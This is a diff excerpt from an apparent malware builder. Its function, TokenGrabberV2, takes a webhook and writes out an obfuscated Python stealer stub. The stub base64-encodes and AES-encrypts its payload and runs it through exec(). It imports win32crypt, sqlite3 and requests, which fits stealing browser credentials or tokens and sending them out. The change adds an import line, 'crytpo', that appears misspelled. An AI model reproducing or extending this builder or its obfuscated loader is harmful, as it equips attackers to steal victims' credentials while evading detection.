@@ -44,7 +44,7 @@ def TokenGrabberV2(WebHook, fileName):
         with open(f'{fileName}.py', "wb") as f:
             encodedBytes = base64.b64encode(_file.encode())
             obfuscatedBytes = AES.new(key.encode(), AES.MODE_CFB, IV).encrypt(encodedBytes)
-            f.write(f'import os;import base64;import requests;import zipfile;import base64;import re;import sqlite3;import json;import shutil ;import win32crypt ;import xml.etree.ElementTree as ET;from Crypto.Cipher import AES;from Crypto.Util.Padding import pad, unpad;exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())
+            f.write(f'import os;import base64;import requests;import zipfile;import base64;import re;import sqlite3;import json;import shutil ;import win32crypt ;import xml.etree.ElementTree as ET;from Crypto.Cipher import AES;from Crypto.Util.Padding import pad, unpad;import crytpo;exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())
 
     print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
     setTitle(f"Creating {fileName}.exe")
